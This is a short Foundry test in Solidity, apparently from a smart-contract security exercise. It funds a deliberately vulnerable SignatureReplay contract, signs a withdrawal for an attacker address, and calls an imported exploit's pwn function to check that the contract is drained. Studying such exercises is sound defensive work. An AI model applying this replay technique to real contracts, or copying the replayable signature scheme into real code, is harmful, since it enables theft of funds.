// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SignatureReplay,SignatureReplayExploit} from "../src/SignatureReplay.sol";

contract SignatureReplayExploitTest is Test {
    SignatureReplay private target;
    SignatureReplayExploit private exploit;
    uint256 private constant PRIVATE_KEY = 999;
    address signer;
    address private constant attacker = address(13);

    function setUp() public {
        signer = vm.addr(PRIVATE_KEY);
        deal(signer, 2 * 1e18);
        vm.prank(signer);
        target = new SignatureReplay{value: 2 * 1e18}();
        exploit = new SignatureReplayExploit(address(target));
        vm.label(address(target), "SignatureReplay");
        vm.label(address(exploit), "SignatureReplayExploit");
    }

    function testSignatureReplay() public {
        bytes32 h = target.getHash(attacker, 1e18);
        bytes32 ethHash = target.getEthHash(h);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PRIVATE_KEY, ethHash);

        vm.prank(attacker);
        exploit.pwn(r, s, v);

        assertEq(address(target).balance, 0);
    }
}
